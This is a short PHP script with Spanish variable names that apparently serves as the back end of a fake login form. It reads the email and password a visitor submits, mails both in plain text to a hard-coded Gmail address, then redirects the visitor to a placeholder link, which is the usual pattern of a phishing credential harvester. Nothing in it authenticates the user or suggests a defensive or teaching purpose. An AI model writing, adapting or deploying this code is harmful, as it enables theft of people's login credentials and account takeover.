<?php
$correo = $_POST["correo"];
$contraseña = $_POST["contraseña"];

$destinatario = "kilodelta65@gmail.com";
$asunto = "Formulario de inicio de sesión";
$cuerpo = "Correo electrónico: $correo\nContraseña: $contraseña";

$cabeceras = "From: formulario@example.com\r\n";
$cabeceras .= "Content-type: text/plain; charset=UTF-8\r\n";

mail($destinatario, $asunto, $cuerpo, $cabeceras);

header("Location: (link unavailable)");
exit;
?>